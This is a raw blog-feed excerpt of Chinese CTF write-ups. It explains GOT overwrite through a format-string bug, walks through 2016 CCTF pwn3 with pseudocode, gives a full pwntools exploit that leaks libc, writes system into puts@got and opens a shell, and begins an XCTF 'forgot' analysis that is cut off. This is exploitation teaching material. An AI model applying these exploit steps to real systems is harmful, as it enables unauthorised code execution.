        <content type="html"><![CDATA[<h2 id="1：原理"><a href="#1：原理" class="headerlink" title="1：原理"></a>1：原理</h2><p>在目前的 C 程序中，libc 中的函数都是通过 GOT 表来跳转的。此外，<strong>在没有开启 RELRO（即 partial RELRO）前提下，每个 libc 的函数对应的 GOT 表项是可以被修改的</strong>。因此，我们可以修改某个 libc 函数的 GOT 表内容为另一个 libc 函数的地址来实现对程序的控制。比如说我们可以修改 printf 的 got 表项内容为 system 函数的地址。从而，程序在执行 printf 的时候实际执行的是 system 函数。</p><p>假设我们将函数 A 的地址覆盖为函数 B 的地址，那么这一攻击技巧可以分为以下步骤：</p><ul><li><p><strong>确定函数 A 的 GOT 表地址</strong><br>   这一步我们利用的函数 A 一般在程序中已有，所以可以采用简单的寻找地址的方法来找。IDA或是ELF等</p></li><li><p><strong>确定函数 B 的内存地址</strong><br>   这一步通常来说，需要我们自己想办法来泄露对应函数 B 的地址。</p></li><li><p><strong>将函数 B 的内存地址写入到函数 A 的 GOT 表地址处</strong></p></li></ul><p>这一步一般来说需要我们利用函数的漏洞来进行触发。一般利用方法有如下3种</p><blockquote><p>写入函数：write 函数。</p></blockquote><blockquote><p>ROP:<br>pop eax; ret;           # printf@got -&gt; eax<br>pop ebx; ret;           # (addr_offset = system_addr - printf_addr) -&gt; ebx 函数间的偏移量<br>add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset</p></blockquote><blockquote><p>格式化字符串任意地址写</p></blockquote><h2 id="2：例子2016-CCTF-–-pwn3"><a href="#2：例子2016-CCTF-–-pwn3" class="headerlink" title="2：例子2016 CCTF – pwn3"></a>2：例子2016 CCTF – pwn3</h2><h3 id="checksec："><a href="#checksec：" class="headerlink" title="checksec："></a>checksec：</h3><pre class=" language-c"><code class="language-c">hunter@hunter<span class="token punctuation">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>wiki<span class="token operator">/</span>formal$ checksec pwn3<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/wiki/formal/pwn3'</span>    Arch<span class="token punctuation">:</span>     i386<span class="token number">-32</span><span class="token operator">-</span>little    RELRO<span class="token punctuation">:</span>    Partial RELRO    Stack<span class="token punctuation">:</span>    No canary found    NX<span class="token punctuation">:</span>       NX enabled           #只开了NX    PIE<span class="token punctuation">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x8048000</span><span class="token punctuation">)</span></code></pre><h3 id="IDA："><a href="#IDA：" class="headerlink" title="IDA："></a>IDA：</h3><p><img src="https://s1.ax1x.com/2020/07/17/U6yi26.png" alt=""><br>ask_username(&amp;s1)和ask_password(&amp;s1)函数可以很容易得出：要输入rxraclhm。<br>get_command()函数，就是输入get，put，dir然后会进入下面相应的函数，如果输入其他的直接退出程序<br>接下来隆重介绍以下函数：<br><strong>put_file（）函数</strong></p><pre class=" language-c"><code class="language-c">_DWORD <span class="token operator">*</span><span class="token function">put_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  _DWORD <span class="token operator">*</span>v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST1C_4     #v0是一个指针，其大小为DWORD4个字节</span>  _DWORD <span class="token operator">*</span>result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  v0 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">244u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     #malloc函数开辟一个大小为<span class="token number">244</span>的堆区  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"please enter the name of the file you want to upload:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">get_input</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v0<span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    #get_input函数别有乾坤  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"then, enter the content:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">get_input</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v0 <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v0<span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">]</span> <span class="token operator">=</span> file_head<span class="token punctuation">;</span>        #file_head是一个全局变量<span class="token punctuation">,</span> BSS段  result <span class="token operator">=</span> v0<span class="token punctuation">;</span>  file_head <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v0<span class="token punctuation">;</span>     #最后堆区的地址给到了file_head Bss段全局变量  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span>get_input函数    将堆区的地址v0传入即a1<span class="token comment" spellcheck="true">// a1是地址  a2是大小  a3是1</span><span class="token keyword">signed</span> <span class="token keyword">int</span> __cdecl <span class="token function">get_input</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  _BYTE <span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+18h] [ebp-10h]</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-Ch]</span>  v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v4 <span class="token operator">=</span> <span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v5 <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>           result <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v5 <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1u</span><span class="token punctuation">,</span> <span class="token number">1u</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   #往a1里面读入字符，一次读一个whle循环    <span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>v4 <span class="token operator">==</span> <span class="token number">10</span> <span class="token operator">&amp;&amp;</span> a3 <span class="token punctuation">)</span>   <span class="token operator">*</span>v4应该不会等于<span class="token number">10</span>，所以我觉都这个<span class="token keyword">if</span>语句完全不会执行，直接执行<span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        result <span class="token operator">=</span> v5 <span class="token operator">+</span> a1<span class="token punctuation">;</span>        <span class="token operator">*</span>v4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> result<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      result <span class="token operator">=</span> <span class="token operator">++</span>v5<span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">>=</span> a2 <span class="token punctuation">)</span>     #控制输入量不会大于a2        <span class="token keyword">return</span> result<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>所以get_input大致作用是：标准输入中读入字符串，写入堆区v0。第一个get_input最多40个字节（字符），第二个从堆区(v0 + 10)开始因为v0是大小为4字节的指针，所以加10将</strong><br><strong>刚好从40个字节后开始填入字符串，最多读入200个：</strong><br><img src="https://s1.ax1x.com/2020/07/17/U6yP8x.png" alt=""></p><p><strong>show_dir函数：</strong></p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">show_dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+14h] [ebp-414h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+414h] [ebp-14h]</span>  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+418h] [ebp-10h]</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+41Ch] [ebp-Ch]</span>  v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">bzero</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">1024u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                              <span class="token comment" spellcheck="true">// 将s数组置零</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> file_head<span class="token punctuation">;</span> i<span class="token punctuation">;</span> i <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">240</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    #首先i被赋值file_head即堆区地址，发现中间i并没有判断，后面的i再次进行赋值  <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>    #中间也没有明显的进行判断    <span class="token punctuation">{</span>      v0 <span class="token operator">=</span> v5<span class="token operator">++</span><span class="token punctuation">;</span>      s<span class="token punctuation">[</span>v0<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>    #对s数组逐个赋值，从堆区地址开始    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><blockquote><p>第一个for循环：i先被赋予堆区地址，中间的表达式（即i）不为0，执行一次内部语句后，i又被堆区240个字节开始赋值，靠后的应该这个区域值为0，所以第一个for应该只会执行一次<br>第二个for循环：中间是直接对(i + j)地址解引用，即(i + j)地址上的字节，显然解引用到值为0的地址才会停。<br>最后是调用puts函数其参数就是经过赋值后的s。<br><img src="https://s1.ax1x.com/2020/07/17/U6yCP1.png" alt=""><br>那么如果我file_name很短，那就只会将fiel_name赋给s数组，然后输出s（什么名字40个字符这么长？？）。那么基本就可以确定puts的参数就是s即file_name</p></blockquote><p><strong>get_file函数：</strong></p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">get_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> dest<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-FCh]</span>  <span class="token keyword">char</span> s1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+E4h] [ebp-34h]</span>  <span class="token keyword">char</span> <span class="token operator">*</span>i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+10Ch] [ebp-Ch]</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"enter the file name you want to get:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%40s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span>   #显然这里不会存在溢出  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"too young, too simple"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>file_head<span class="token punctuation">;</span> i<span class="token punctuation">;</span> i <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>i <span class="token operator">+</span> <span class="token number">60</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>   #第一个是i被赋予堆区地址，第二个i显然不会为<span class="token number">0</span>，第三个将i转换为<span class="token number">4</span>字节指针后加<span class="token number">60</span>那其实                                                                        又是堆区<span class="token number">240</span>字节后的区域，将使i<span class="token operator">=</span> <span class="token number">0</span> ，所以这个<span class="token keyword">for</span>也只执行一次  <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token operator">&amp;</span>s1<span class="token punctuation">)</span> <span class="token punctuation">)</span>                      <span class="token comment" spellcheck="true">// 堆区开头是file_name 所以输入对应的file_name到s1即可进入if</span>    <span class="token punctuation">{</span>      <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dest<span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">// i+40地址处的是我们的content </span>      <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>所以整个函数是你输入对应的file_name就输出对应的tontent（结合程序本身，伪码有些不一定准确），显然这个printf是存在格式化字符串漏洞的，但是它的参数是i+40即tontent的内容。</p><h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><p><strong>首先可以用这个漏洞泄露函数真实地址，从而得到libc版本。又ASLR没开，能漏洞改写函数got表上的地址，改成system地址。因为我们不能控制程序流程，只能靠跳转实现system（无法在栈上构造数据）。system函数只有一个参数，纵观程序中所有函数只有puts函数如此相像，我们想办法把puts的got表上的地址改为system地址，然后它的参数s内容搞成/bin/sh字符串即可。</strong></p><blockquote><p>确定格式化字符串参数偏移<br>利用 __libc_start_main_got 获取 put 函数地址，进而获取对应的 libc.so 的版本，进而获取对应 system 函数地址。<br>参数s就是我们的file_name<br>修改 puts@got 的内容为 system 的地址。<br>当程序再次执行 puts 函数的时候，其实执行的是 system 函数。</p></blockquote><h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><p>注意printf漏洞是在get_file函数中实现的，所以一定要记得调用get选项</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span> context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'pwn3'</span><span class="token punctuation">)</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>main_start_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>main_start_got<span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn3'</span><span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'rxraclhm'</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#密码绕过</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'put'</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#调用put函数</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>name <span class="token operator">=</span> <span class="token string">'/sh'</span>      <span class="token comment" spellcheck="true">#名字/sh</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span>content <span class="token operator">=</span> <span class="token string">'%8$s'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main_start_got<span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#准备__libc_start_main地址的泄露</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'get'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用get函数利用漏洞</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/sh'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#print u32(sh.recv(4))</span>main_start_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#得到地址</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">,</span>main_start_addr<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#得到libc版本</span>libc_addr <span class="token operator">=</span> main_start_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>libc_addr<span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>binsh_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">)</span>   sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'put'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用put函数</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#名字/bin</span>payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token punctuation">{</span>puts_got<span class="token punctuation">:</span>system_addr<span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#准备将system地址写入puts_got</span><span class="token keyword">print</span> payload<span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'get'</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#调用get函数利用漏洞</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin'</span><span class="token punctuation">)</span>  <span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#调用dir函数，此时s是/bin/sh 可通过调试得出</span><span class="token comment" spellcheck="true">#sh.recv()            最后将跳转puts函数参数为/bin/sh但执行system函数，得到shell</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：</p><pre class=" language-c"><code class="language-c">    000000d0  <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span>  <span class="token number">00</span> <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span>  <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span>  <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span>  │    │·   │    │    │    <span class="token number">000000e0</span>  <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span>  <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span>  <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span>  <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span>  │    │    │    │    │    000000f0  <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span> <span class="token number">20</span>  <span class="token number">20</span> <span class="token number">20</span> <span class="token number">00</span> <span class="token number">61</span>  <span class="token number">61</span> <span class="token number">61</span> <span class="token number">28</span> a0  <span class="token number">04</span> <span class="token number">08</span> <span class="token number">29</span> a0  │    │  ·a│<span class="token function">aa</span><span class="token punctuation">(</span>·│··<span class="token punctuation">)</span>·│    <span class="token number">00000100</span>  <span class="token number">04</span> <span class="token number">08</span> 2a a0  <span class="token number">04</span> <span class="token number">08</span> 2b a0  <span class="token number">04</span> <span class="token number">08</span> <span class="token number">66</span> <span class="token number">74</span>  <span class="token number">70</span> 3e        │··<span class="token operator">*</span>·│··<span class="token operator">+</span>·│··ft│p<span class="token operator">></span>│    0000010e               \x98            \x04                                                                                                                                                                                      \x00                                \<span class="token function">x00aa</span><span class="token punctuation">(</span>\xa0\x04<span class="token punctuation">)</span>\xa0\x04<span class="token operator">*</span>\xa0\x04<span class="token operator">+</span>\xa0\x04ftp<span class="token operator">></span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x4</span> bytes<span class="token punctuation">:</span>    <span class="token string">'dir\n'</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode$ whoami<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x7</span> bytes<span class="token punctuation">:</span>    <span class="token string">'whoami\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x7</span> bytes<span class="token punctuation">:</span>    <span class="token string">'hunter\n'</span>hunter$  </code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xctf-challege-forgot</title>
      <link href="/2020/07/16/xctf-challege-forgot/"/>
      <url>/2020/07/16/xctf-challege-forgot/</url>
      
        <content type="html"><![CDATA[<h2 id="1：checksec"><a href="#1：checksec" class="headerlink" title="1：checksec"></a>1：checksec</h2><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/XCTF/xctf_challenge$ checksec forgot<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/XCTF/xctf_challenge/forgot'</span>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span></code></pre><p>只开了NX</p><h2 id="2：IDA"><a href="#2：IDA" class="headerlink" title="2：IDA"></a>2：IDA</h2><pre class=" language-c"><code class="language-c">main函数关键代码size_t v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ebx</span>  <span class="token keyword">char</span> v2<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+10h] [ebp-74h]</span>  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>fun1<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+30h] [ebp-54h]  #显然这是一串指针数组，指向函数</span>  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>fun2<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+34h] [ebp-50h]</span>  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>fun3<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+38h] [ebp-4Ch]</span>  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>v6<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+3Ch] [ebp-48h]</span>  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>v7<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+40h] [ebp-44h]</span>  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>v8<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+44h] [ebp-40h]</span>  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>v9<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+48h] [ebp-3Ch]</span>  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>v10<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4Ch] [ebp-38h]</span>  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>v11<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+50h] [ebp-34h]</span>  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>v12<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+54h] [ebp-30h]</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+58h] [ebp-2Ch]</span>  <span class="token keyword">int</span> v14<span class="token 